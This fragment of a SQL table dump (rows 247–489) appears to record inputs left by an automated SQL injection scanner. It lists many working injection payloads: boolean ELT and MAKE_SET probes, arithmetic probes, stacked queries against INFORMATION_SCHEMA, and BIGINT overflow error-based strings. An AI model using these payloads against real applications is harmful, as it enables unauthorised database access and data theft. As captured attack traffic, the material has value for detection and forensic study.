(247, 'wtaG', '', 'Fvmz\"))) AND ELT(9646=9646,2273) AND (((\"kdax\"=\"kdax', ''),
(248, 'wtaG', '', 'Fvmz\" AND ELT(9392=6698,6698) AND \"DjSr\"=\"DjSr', ''),
(249, 'wtaG', '', 'Fvmz\" AND ELT(9646=9646,2273) AND \"WCRw\"=\"WCRw', ''),
(250, 'wtaG', '', 'Fvmz\") AND ELT(7645=6664,6664) AND (\"TYfl\" LIKE \"TYfl', ''),
(251, 'wtaG', '', 'Fvmz\") AND ELT(9646=9646,2273) AND (\"FsmS\" LIKE \"FsmS', ''),
(252, 'wtaG', '', 'Fvmz\")) AND ELT(3875=5797,5797) AND ((\"BZlr\" LIKE \"BZlr', ''),
(253, 'wtaG', '', 'Fvmz\")) AND ELT(9646=9646,2273) AND ((\"NxNu\" LIKE \"NxNu', ''),
(254, 'wtaG', '', 'Fvmz\"))) AND ELT(4158=5145,5145) AND (((\"AqNp\" LIKE \"AqNp', ''),
(255, 'wtaG', '', 'Fvmz\"))) AND ELT(9646=9646,2273) AND (((\"TCMl\" LIKE \"TCMl', ''),
(256, 'wtaG', '', 'Fvmz\" AND ELT(8772=6225,6225) AND \"rZZp\" LIKE \"rZZp', ''),
(257, 'wtaG', '', 'Fvmz\" AND ELT(9646=9646,2273) AND \"GPDz\" LIKE \"GPDz', ''),
(258, 'wtaG', '', 'Fvmz\")) AS mDyx WHERE 9802=9802 AND ELT(2100=4984,4984)-- Nwth', ''),
(259, 'wtaG', '', 'Fvmz\")) AS HBhX WHERE 9760=9760 AND ELT(9646=9646,2273)-- jHHa', ''),
(260, 'wtaG', '', 'Fvmz\") AS pMcP WHERE 9082=9082 AND ELT(8172=7567,7567)-- GgaL', ''),
(261, 'wtaG', '', 'Fvmz\") AS obGt WHERE 5027=5027 AND ELT(9646=9646,2273)-- GYjS', ''),
(262, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND ELT(5609=7304,7304) AND \"Fvmz\"=\"Fvmz', ''),
(263, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND ELT(9646=9646,2273) AND \"Fvmz\"=\"Fvmz', ''),
(264, 'wtaG', '', 'Fvmz) AND ELT(7127=9050,9050)-- JJFl', ''),
(265, 'wtaG', '', 'Fvmz) AND ELT(9646=9646,2273)-- FKDE', ''),
(266, 'wtaG', '', 'Fvmz) AND ELT(3096=3269,3269) AND (7031=7031', ''),
(267, 'wtaG', '', 'Fvmz) AND ELT(9646=9646,2273) AND (8925=8925', ''),
(268, 'wtaG', '', 'Fvmz)) AND ELT(5821=1004,1004) AND ((9451=9451', ''),
(269, 'wtaG', '', 'Fvmz)) AND ELT(9646=9646,2273) AND ((6314=6314', ''),
(270, 'wtaG', '', 'Fvmz))) AND ELT(4044=6279,6279) AND (((2837=2837', ''),
(271, 'wtaG', '', 'Fvmz))) AND ELT(9646=9646,2273) AND (((8237=8237', ''),
(272, 'wtaG', '', 'Fvmz AND ELT(2912=8797,8797)', ''),
(273, 'wtaG', '', 'Fvmz AND ELT(9646=9646,2273)', ''),
(274, 'wtaG', '', 'Fvmz AND ELT(1493=1165,1165)-- Prjv', ''),
(275, 'wtaG', '', 'Fvmz AND ELT(9646=9646,2273)-- sIGo', ''),
(276, 'wtaG', '', 'Fvmz AND ELT(2913=3231,3231)# Rftn', ''),
(277, 'wtaG', '', 'Fvmz AND ELT(9646=9646,2273)# cPiz', ''),
(278, 'wtaG', '', 'Fvmz)) AS GMlY WHERE 8888=8888 AND ELT(3932=8976,8976)-- lTos', ''),
(279, 'wtaG', '', 'Fvmz)) AS ZHeT WHERE 6316=6316 AND ELT(9646=9646,2273)-- KurN', ''),
(280, 'wtaG', '', 'Fvmz) AS rhSp WHERE 9296=9296 AND ELT(8652=7093,7093)-- WUNv', ''),
(281, 'wtaG', '', 'Fvmz) AS ZEkY WHERE 9317=9317 AND ELT(9646=9646,2273)-- JwPy', ''),
(282, 'wtaG', '', 'Fvmz` WHERE 7570=7570 AND ELT(6805=1525,1525)-- bUNY', ''),
(283, 'wtaG', '', 'Fvmz` WHERE 9394=9394 AND ELT(9646=9646,2273)-- tMsV', ''),
(284, 'wtaG', '', 'Fvmz`) WHERE 4653=4653 AND ELT(5372=2817,2817)-- VxCJ', ''),
(285, 'wtaG', '', 'Fvmz`) WHERE 8720=8720 AND ELT(9646=9646,2273)-- wrDF', ''),
(286, 'wtaG', '', 'Fvmz`=`Fvmz` AND ELT(9036=5513,5513) AND `Fvmz`=`Fvmz', ''),
(287, 'wtaG', '', 'Fvmz`=`Fvmz` AND ELT(9646=9646,2273) AND `Fvmz`=`Fvmz', ''),
(288, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 6320=6320 AND ELT(2264=4452,4452))|[Fvmz', ''),
(289, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 7788=7788 AND ELT(9646=9646,2273))|[Fvmz', ''),
(290, 'wtaG', '', '-9182\" OR ELT(2798=6629,6629)-- ZHkp', ''),
(291, 'wtaG', '', '-1342\" OR ELT(1518=1518,6285)-- JxwF', ''),
(292, 'wtaG', '', '1', ''),
(293, 'wtaG', '', '1', ''),
(294, 'wtaG', '', '1', ''),
(295, 'wtaG', '', '1', ''),
(296, 'wtaG', '', '-3908\") OR ELT(5082=5298,5298) AND (\"eceK\"=\"eceK', ''),
(297, 'wtaG', '', '-1402\") OR ELT(1518=1518,6285) AND (\"YvlB\"=\"YvlB', ''),
(298, 'wtaG', '', '-8611\")) OR ELT(2663=3989,3989) AND ((\"rJYq\"=\"rJYq', ''),
(299, 'wtaG', '', '-9854\")) OR ELT(1518=1518,6285) AND ((\"maiK\"=\"maiK', ''),
(300, 'wtaG', '', '-1673\"))) OR ELT(6490=6361,6361) AND (((\"goXs\"=\"goXs', ''),
(301, 'wtaG', '', '-4887\"))) OR ELT(1518=1518,6285) AND (((\"gaRf\"=\"gaRf', ''),
(302, 'wtaG', '', '-1955\" OR ELT(8111=8228,8228) AND \"Cyah\"=\"Cyah', ''),
(303, 'wtaG', '', '-7388\" OR ELT(1518=1518,6285) AND \"zCle\"=\"zCle', ''),
(304, 'wtaG', '', '-9329\") OR ELT(1152=8002,8002) AND (\"NCHn\" LIKE \"NCHn', ''),
(305, 'wtaG', '', '-5296\") OR ELT(1518=1518,6285) AND (\"DouW\" LIKE \"DouW', ''),
(306, 'wtaG', '', '-3387\")) OR ELT(6120=5723,5723) AND ((\"XAnD\" LIKE \"XAnD', ''),
(307, 'wtaG', '', '-2376\")) OR ELT(1518=1518,6285) AND ((\"sVMx\" LIKE \"sVMx', ''),
(308, 'wtaG', '', '-1766\"))) OR ELT(1649=2991,2991) AND (((\"sBCI\" LIKE \"sBCI', ''),
(309, 'wtaG', '', '-3324\"))) OR ELT(1518=1518,6285) AND (((\"BtfI\" LIKE \"BtfI', ''),
(310, 'wtaG', '', '-6828\" OR ELT(9594=7266,7266) AND \"DZXP\" LIKE \"DZXP', ''),
(311, 'wtaG', '', '-7453\" OR ELT(1518=1518,6285) AND \"AVWK\" LIKE \"AVWK', ''),
(312, 'wtaG', '', '1', ''),
(313, 'wtaG', '', '1', ''),
(314, 'wtaG', '', '-5239\")) AS NvRm WHERE 5511=5511 OR ELT(6349=9312,9312)-- trlj', ''),
(315, 'wtaG', '', '-1032\")) AS DXoP WHERE 7819=7819 OR ELT(1518=1518,6285)-- ofAX', ''),
(316, 'wtaG', '', '-6586\") AS FKnv WHERE 1491=1491 OR ELT(4147=2077,2077)-- fFrw', ''),
(317, 'wtaG', '', '-7897\") AS tmIf WHERE 7315=7315 OR ELT(1518=1518,6285)-- MKVH', ''),
(318, 'wtaG', '', '-2544) OR ELT(7781=4496,4496)-- xrWj', ''),
(319, 'wtaG', '', '-1856) OR ELT(1518=1518,6285)-- SmvI', ''),
(320, 'wtaG', '', '-2798) OR ELT(8349=1921,1921) AND (4988=4988', ''),
(321, 'wtaG', '', '-3165) OR ELT(1518=1518,6285) AND (5769=5769', ''),
(322, 'wtaG', '', '-1245)) OR ELT(2000=5706,5706) AND ((2588=2588', ''),
(323, 'wtaG', '', '-5334)) OR ELT(1518=1518,6285) AND ((7525=7525', ''),
(324, 'wtaG', '', '-5843))) OR ELT(8821=6407,6407) AND (((8964=8964', ''),
(325, 'wtaG', '', '-3086))) OR ELT(1518=1518,6285) AND (((1942=1942', ''),
(326, 'wtaG', '', '-5773 OR ELT(5765=1088,1088)', ''),
(327, 'wtaG', '', '-7173 OR ELT(1518=1518,6285)', ''),
(328, 'wtaG', '', '-7647 OR ELT(3046=6136,6136)-- ldvo', ''),
(329, 'wtaG', '', '-2952 OR ELT(1518=1518,6285)-- JTZs', ''),
(330, 'wtaG', '', '-5722 OR ELT(4662=9452,9452)# eVDc', ''),
(331, 'wtaG', '', '-4989 OR ELT(1518=1518,6285)# QPvq', ''),
(332, 'wtaG', '', '-4922)) AS zKLs WHERE 9008=9008 OR ELT(1908=2595,2595)-- bLcA', ''),
(333, 'wtaG', '', '-2694)) AS FDof WHERE 9169=9169 OR ELT(1518=1518,6285)-- CKQe', ''),
(334, 'wtaG', '', '-5831) AS btxc WHERE 8266=8266 OR ELT(9020=9619,9619)-- jUbg', ''),
(335, 'wtaG', '', '-6367) AS XpuF WHERE 3520=3520 OR ELT(1518=1518,6285)-- ecsl', ''),
(336, 'wtaG', '', 'Fvmz\" AND (9696=7935)*7935-- ykLK', ''),
(337, 'wtaG', '', 'Fvmz\" AND (5500=5500)*2610-- TbXL', ''),
(338, 'wtaG', '', 'Fvmz\") AND (8040=1721)*1721 AND (\"CYfP\"=\"CYfP', ''),
(339, 'wtaG', '', 'Fvmz\") AND (5500=5500)*2610 AND (\"eKii\"=\"eKii', ''),
(340, 'wtaG', '', 'Fvmz\")) AND (9459=9675)*9675 AND ((\"UkGq\"=\"UkGq', ''),
(341, 'wtaG', '', 'Fvmz\")) AND (5500=5500)*2610 AND ((\"RtKO\"=\"RtKO', ''),
(342, 'wtaG', '', 'Fvmz\"))) AND (9147=9422)*9422 AND (((\"pNSA\"=\"pNSA', ''),
(343, 'wtaG', '', 'Fvmz\"))) AND (5500=5500)*2610 AND (((\"wbBz\"=\"wbBz', ''),
(344, 'wtaG', '', 'Fvmz\" AND (9709=8039)*8039 AND \"lkSO\"=\"lkSO', ''),
(345, 'wtaG', '', 'Fvmz\" AND (5500=5500)*2610 AND \"kBwU\"=\"kBwU', ''),
(346, 'wtaG', '', 'Fvmz\") AND (3760=7769)*7769 AND (\"FSks\" LIKE \"FSks', ''),
(347, 'wtaG', '', 'Fvmz\") AND (5500=5500)*2610 AND (\"zMSx\" LIKE \"zMSx', ''),
(348, 'wtaG', '', 'Fvmz\")) AND (4828=6471)*6471 AND ((\"KeHl\" LIKE \"KeHl', ''),
(349, 'wtaG', '', 'Fvmz\")) AND (5500=5500)*2610 AND ((\"Uymq\" LIKE \"Uymq', ''),
(350, 'wtaG', '', 'Fvmz\"))) AND (4529=1750)*1750 AND (((\"LIBP\" LIKE \"LIBP', ''),
(351, 'wtaG', '', 'Fvmz\"))) AND (5500=5500)*2610 AND (((\"kjzk\" LIKE \"kjzk', ''),
(352, 'wtaG', '', 'Fvmz\" AND (6861=6497)*6497 AND \"qvVB\" LIKE \"qvVB', ''),
(353, 'wtaG', '', 'Fvmz\" AND (5500=5500)*2610 AND \"CTxC\" LIKE \"CTxC', ''),
(354, 'wtaG', '', 'Fvmz\")) AS QUra WHERE 9644=9644 AND (1236=9330)*9330-- cMAV', ''),
(355, 'wtaG', '', 'Fvmz\")) AS aCpn WHERE 7752=7752 AND (5500=5500)*2610-- wxrP', ''),
(356, 'wtaG', '', 'Fvmz\") AS MAUu WHERE 9253=9253 AND (1551=3984)*3984-- fmHI', ''),
(357, 'wtaG', '', 'Fvmz\") AS cGjl WHERE 8026=8026 AND (5500=5500)*2610-- qxOq', ''),
(358, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND (8967=9275)*9275 AND \"Fvmz\"=\"Fvmz', ''),
(359, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND (5500=5500)*2610 AND \"Fvmz\"=\"Fvmz', ''),
(360, 'wtaG', '', 'Fvmz) AND (8934=2330)*2330-- uNnf', ''),
(361, 'wtaG', '', 'Fvmz) AND (5500=5500)*2610-- czHF', ''),
(362, 'wtaG', '', 'Fvmz) AND (1631=8148)*8148 AND (7870=7870', ''),
(363, 'wtaG', '', 'Fvmz) AND (5500=5500)*2610 AND (8736=8736', ''),
(364, 'wtaG', '', 'Fvmz)) AND (7982=2556)*2556 AND ((8752=8752', ''),
(365, 'wtaG', '', 'Fvmz)) AND (5500=5500)*2610 AND ((7246=7246', ''),
(366, 'wtaG', '', 'Fvmz))) AND (9643=6986)*6986 AND (((7233=7233', ''),
(367, 'wtaG', '', 'Fvmz))) AND (5500=5500)*2610 AND (((6603=6603', ''),
(368, 'wtaG', '', 'Fvmz AND (2463=7722)*7722', ''),
(369, 'wtaG', '', 'Fvmz AND (5500=5500)*2610', ''),
(370, 'wtaG', '', 'Fvmz AND (3584=1635)*1635-- vLPU', ''),
(371, 'wtaG', '', 'Fvmz AND (5500=5500)*2610-- seWS', ''),
(372, 'wtaG', '', 'Fvmz AND (4337=8577)*8577# tFlU', ''),
(373, 'wtaG', '', 'Fvmz AND (5500=5500)*2610# nyPR', ''),
(374, 'wtaG', '', 'Fvmz)) AS sLox WHERE 2423=2423 AND (4522=8188)*8188-- pYgU', ''),
(375, 'wtaG', '', 'Fvmz)) AS BWhU WHERE 1219=1219 AND (5500=5500)*2610-- mwfR', ''),
(376, 'wtaG', '', 'Fvmz) AS uIrC WHERE 6078=6078 AND (8720=8988)*8988-- pHyg', ''),
(377, 'wtaG', '', 'Fvmz) AS LTrb WHERE 2258=2258 AND (5500=5500)*2610-- MMVR', ''),
(378, 'wtaG', '', 'Fvmz` WHERE 2824=2824 AND (8144=3746)*3746-- Gtnz', ''),
(379, 'wtaG', '', 'Fvmz` WHERE 1979=1979 AND (5500=5500)*2610-- PhxY', ''),
(380, 'wtaG', '', 'Fvmz`) WHERE 6958=6958 AND (9257=5376)*5376-- yLOT', ''),
(381, 'wtaG', '', 'Fvmz`) WHERE 6076=6076 AND (5500=5500)*2610-- nBIL', ''),
(382, 'wtaG', '', 'Fvmz`=`Fvmz` AND (5124=7640)*7640 AND `Fvmz`=`Fvmz', ''),
(383, 'wtaG', '', 'Fvmz`=`Fvmz` AND (5500=5500)*2610 AND `Fvmz`=`Fvmz', ''),
(384, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 1503=1503 AND (7141=6551)*6551)|[Fvmz', ''),
(385, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 9250=9250 AND (5500=5500)*2610)|[Fvmz', ''),
(386, 'wtaG', '', '-3224\" OR (6053=7472)*7472-- XXen', ''),
(387, 'wtaG', '', '-9139\" OR (8251=8251)*6926-- FjUN', ''),
(388, 'wtaG', '', '1', ''),
(389, 'wtaG', '', '1', ''),
(390, 'wtaG', '', '1', ''),
(391, 'wtaG', '', '1', ''),
(392, 'wtaG', '', '-8646\") OR (8651=3638)*3638 AND (\"rwaW\"=\"rwaW', ''),
(393, 'wtaG', '', '-9166\") OR (8251=8251)*6926 AND (\"oiSb\"=\"oiSb', ''),
(394, 'wtaG', '', '-4400\")) OR (1782=8411)*8411 AND ((\"BLbs\"=\"BLbs', ''),
(395, 'wtaG', '', '-9270\")) OR (8251=8251)*6926 AND ((\"OduU\"=\"OduU', ''),
(396, 'wtaG', '', '-1099\"))) OR (2791=4364)*4364 AND (((\"kILJ\"=\"kILJ', ''),
(397, 'wtaG', '', '-9207\"))) OR (8251=8251)*6926 AND (((\"wCeY\"=\"wCeY', ''),
(398, 'wtaG', '', '-3926\" OR (5313=3075)*3075 AND \"sBST\"=\"sBST', ''),
(399, 'wtaG', '', '-8271\" OR (8251=8251)*6926 AND \"Msmx\"=\"Msmx', ''),
(400, 'wtaG', '', '-5030\") OR (3537=7569)*7569 AND (\"vsRP\" LIKE \"vsRP', ''),
(401, 'wtaG', '', '-8441\") OR (8251=8251)*6926 AND (\"Vysq\" LIKE \"Vysq', ''),
(402, 'wtaG', '', '-5611\")) OR (2728=8926)*8926 AND ((\"RLAi\" LIKE \"RLAi', ''),
(403, 'wtaG', '', '-9525\")) OR (8251=8251)*6926 AND ((\"DRFR\" LIKE \"DRFR', ''),
(404, 'wtaG', '', '-8919\"))) OR (2588=3791)*3791 AND (((\"nYNd\" LIKE \"nYNd', ''),
(405, 'wtaG', '', '-4824\"))) OR (8251=8251)*6926 AND (((\"hRhy\" LIKE \"hRhy', ''),
(406, 'wtaG', '', '-4150\" OR (2780=1590)*1590 AND \"eutl\" LIKE \"eutl', ''),
(407, 'wtaG', '', '-4465\" OR (8251=8251)*6926 AND \"XxEz\" LIKE \"XxEz', ''),
(408, 'wtaG', '', '1', ''),
(409, 'wtaG', '', '1', ''),
(410, 'wtaG', '', '-9157\")) AS HEOv WHERE 6441=6441 OR (3728=9421)*9421-- Zdht', ''),
(411, 'wtaG', '', '-7959\")) AS KEVf WHERE 5850=5850 OR (8251=8251)*6926-- ounU', ''),
(412, 'wtaG', '', '-7487\") AS EReV WHERE 7101=7101 OR (4592=3477)*3477-- PZwB', ''),
(413, 'wtaG', '', '-8200\") AS mVgB WHERE 3251=3251 OR (8251=8251)*6926-- kLPt', ''),
(414, 'wtaG', '', '-4847) OR (4966=5710)*5710-- YEJM', ''),
(415, 'wtaG', '', '-6039) OR (8251=8251)*6926-- Kcyo', ''),
(416, 'wtaG', '', '-9091) OR (8400=1750)*1750 AND (4829=4829', ''),
(417, 'wtaG', '', '-7029) OR (8251=8251)*6926 AND (6994=6994', ''),
(418, 'wtaG', '', '-5488)) OR (9277=3484)*3484 AND ((7308=7308', ''),
(419, 'wtaG', '', '-6049)) OR (8251=8251)*6926 AND ((4918=4918', ''),
(420, 'wtaG', '', '-1333))) OR (3121=4760)*4760 AND (((5811=5811', ''),
(421, 'wtaG', '', '-3589))) OR (8251=8251)*6926 AND (((9019=9019', ''),
(422, 'wtaG', '', '-9024 OR (3798=5663)*5663', ''),
(423, 'wtaG', '', '-7571 OR (8251=8251)*6926', ''),
(424, 'wtaG', '', '-7076 OR (2163=1598)*1598-- Gcsl', ''),
(425, 'wtaG', '', '-3033 OR (8251=8251)*6926-- VkMF', ''),
(426, 'wtaG', '', '-7460 OR (9786=3977)*3977# WYfZ', ''),
(427, 'wtaG', '', '-6277 OR (8251=8251)*6926# HPDY', ''),
(428, 'wtaG', '', '-4958)) AS FYlG WHERE 5047=5047 OR (1451=5862)*5862-- Evrz', ''),
(429, 'wtaG', '', '-9500)) AS HufH WHERE 2999=2999 OR (8251=8251)*6926-- ochV', ''),
(430, 'wtaG', '', '-8048) AS aAao WHERE 9145=9145 OR (6439=4904)*4904-- yQbQ', ''),
(431, 'wtaG', '', '-1130) AS kvyJ WHERE 6839=6839 OR (8251=8251)*6926-- YWgG', ''),
(432, 'wtaG', '', 'MAKE_SET(3608=3629,3629)', ''),
(433, 'wtaG', '', 'MAKE_SET(2247=2247,9777)', ''),
(434, 'wtaG', '', 'MAKE_SET(2766=4061,0x46766d7a)', ''),
(435, 'wtaG', '', 'MAKE_SET(3810=3810,0x46766d7a)', ''),
(436, 'wtaG', '', 'ELT(2172=8084,8084)', ''),
(437, 'wtaG', '', 'ELT(9315=9315,1724)', ''),
(438, 'wtaG', '', 'ELT(8087=6802,0x46766d7a)', ''),
(439, 'wtaG', '', 'ELT(6847=6847,0x46766d7a)', ''),
(440, 'wtaG', '', '(8993=7670)*7670', ''),
(441, 'wtaG', '', '(2497=2497)*9065', ''),
(442, 'wtaG', '', '(2749=6929)*0x46766d7a', ''),
(443, 'wtaG', '', '(2043=2043)*0x46766d7a', ''),
(444, 'wtaG', '', 'Fvmz,(SELECT (CASE WHEN (3747=1162) THEN 1 ELSE 3747*(SELECT 3747 FROM INFORMATION_SCHEMA.PLUGINS) END))', ''),
(445, 'wtaG', '', 'Fvmz,(SELECT (CASE WHEN (9008=9008) THEN 1 ELSE 9008*(SELECT 9008 FROM INFORMATION_SCHEMA.PLUGINS) END))', ''),
(446, 'wtaG', '', 'Fvmz,(SELECT (CASE WHEN (8282=6586) THEN 0x46766d7a ELSE 8282*(SELECT 8282 FROM INFORMATION_SCHEMA.PLUGINS) END))', ''),
(447, 'wtaG', '', 'Fvmz,(SELECT (CASE WHEN (9992=9992) THEN 0x46766d7a ELSE 9992*(SELECT 9992 FROM INFORMATION_SCHEMA.PLUGINS) END))', ''),
(448, 'wtaG', '', 'Fvmz\";SELECT (CASE WHEN (8107=1446) THEN 8107 ELSE 8107*(SELECT 8107 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(449, 'wtaG', '', 'Fvmz\";SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(450, 'wtaG', '', 'Fvmz\");SELECT (CASE WHEN (5625=1280) THEN 5625 ELSE 5625*(SELECT 5625 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(451, 'wtaG', '', 'Fvmz\");SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(452, 'wtaG', '', 'Fvmz\"));SELECT (CASE WHEN (9517=6611) THEN 9517 ELSE 9517*(SELECT 9517 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(453, 'wtaG', '', 'Fvmz\"));SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(454, 'wtaG', '', 'Fvmz\")));SELECT (CASE WHEN (6121=2675) THEN 6121 ELSE 6121*(SELECT 6121 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(455, 'wtaG', '', 'Fvmz\")));SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(456, 'wtaG', '', 'Fvmz\")) AS iRrS WHERE 1968=1968;SELECT (CASE WHEN (3484=7811) THEN 3484 ELSE 3484*(SELECT 3484 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(457, 'wtaG', '', 'Fvmz\")) AS yHbJ WHERE 8480=8480;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(458, 'wtaG', '', 'Fvmz\") AS RhxW WHERE 3496=3496;SELECT (CASE WHEN (2045=7668) THEN 2045 ELSE 2045*(SELECT 2045 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(459, 'wtaG', '', 'Fvmz\") AS iVel WHERE 8846=8846;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(460, 'wtaG', '', 'Fvmz\"=\"Fvmz\";SELECT (CASE WHEN (6671=2815) THEN 6671 ELSE 6671*(SELECT 6671 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(461, 'wtaG', '', 'Fvmz\"=\"Fvmz\";SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(462, 'wtaG', '', 'Fvmz);SELECT (CASE WHEN (6106=7128) THEN 6106 ELSE 6106*(SELECT 6106 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(463, 'wtaG', '', 'Fvmz);SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(464, 'wtaG', '', 'Fvmz));SELECT (CASE WHEN (6076=8901) THEN 6076 ELSE 6076*(SELECT 6076 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(465, 'wtaG', '', 'Fvmz));SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(466, 'wtaG', '', 'Fvmz)));SELECT (CASE WHEN (7761=4758) THEN 7761 ELSE 7761*(SELECT 7761 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(467, 'wtaG', '', 'Fvmz)));SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(468, 'wtaG', '', 'Fvmz;SELECT (CASE WHEN (2087=6495) THEN 2087 ELSE 2087*(SELECT 2087 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(469, 'wtaG', '', 'Fvmz;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(470, 'wtaG', '', 'Fvmz)) AS qkLu WHERE 5996=5996;SELECT (CASE WHEN (4697=4435) THEN 4697 ELSE 4697*(SELECT 4697 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(471, 'wtaG', '', 'Fvmz)) AS WKmb WHERE 8499=8499;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(472, 'wtaG', '', 'Fvmz) AS OuZJ WHERE 8474=8474;SELECT (CASE WHEN (4861=4084) THEN 4861 ELSE 4861*(SELECT 4861 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(473, 'wtaG', '', 'Fvmz) AS uiKJ WHERE 9295=9295;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(474, 'wtaG', '', 'Fvmz` WHERE 2379=2379;SELECT (CASE WHEN (5458=6794) THEN 5458 ELSE 5458*(SELECT 5458 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(475, 'wtaG', '', 'Fvmz` WHERE 1390=1390;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(476, 'wtaG', '', 'Fvmz`) WHERE 7104=7104;SELECT (CASE WHEN (8158=5260) THEN 8158 ELSE 8158*(SELECT 8158 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(477, 'wtaG', '', 'Fvmz`) WHERE 8661=8661;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(478, 'wtaG', '', 'Fvmz`=`Fvmz`;SELECT (CASE WHEN (4756=4734) THEN 4756 ELSE 4756*(SELECT 4756 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(479, 'wtaG', '', 'Fvmz`=`Fvmz`;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(480, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 7387=7387;SELECT (CASE WHEN (4176=5914) THEN 4176 ELSE 4176*(SELECT 4176 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(481, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 3384=3384;SELECT (CASE WHEN (2161=2161) THEN 2161 ELSE 2161*(SELECT 2161 FROM INFORMATION_SCHEMA.PLUGINS) END)#', ''),
(482, 'wtaG', '', 'Fvmz\" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- OqsK', ''),
(483, 'wtaG', '', 'Fvmz\") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (\"lfIm\"=\"lfIm', ''),
(484, 'wtaG', '', 'Fvmz\")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((\"drYJ\"=\"drYJ', ''),
(485, 'wtaG', '', 'Fvmz\"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((\"VJKU\"=\"VJKU', ''),
(486, 'wtaG', '', 'Fvmz\" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"PEAJ\"=\"PEAJ', ''),
(487, 'wtaG', '', 'Fvmz\") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (\"BcuB\" LIKE \"BcuB', ''),
(488, 'wtaG', '', 'Fvmz\")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((\"BMbP\" LIKE \"BMbP', ''),
(489, 'wtaG', '', 'Fvmz\"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((\"pZFp\" LIKE \"pZFp', ''),
